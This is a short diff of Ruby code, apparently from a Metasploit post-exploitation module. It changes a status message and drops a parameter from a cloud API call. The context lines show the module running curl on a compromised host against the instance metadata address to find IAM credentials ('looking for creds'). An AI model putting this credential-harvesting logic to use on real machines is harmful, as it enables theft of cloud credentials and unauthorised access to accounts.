@@ -14,7 +14,7 @@ module Metasploit
           cmd_out = cmd_exec("curl --version")
           if cmd_out =~ /^curl \d/
             url = "http://#{datastore['METADATA_IP']}/2012-01-12/meta-data/"
-            print_status("#{peer} - looking for creds...")
+            print_status("#{datastore['METADATA_IP']} - looking for creds...")
             resp = cmd_exec("curl #{url}")
             if resp =~ /^iam.*/
               resp = cmd_exec("curl #{url}iam/")
@@ -138,7 +138,7 @@ module Metasploit
           idoc
         end
 
-        def call_api(creds, opts, service, api_params)
+        def call_api(creds, service, api_params)
           print_status("#{peer} - Connecting (#{datastore['RHOST']})...")
           body = body(api_params)
           body_length = body.length
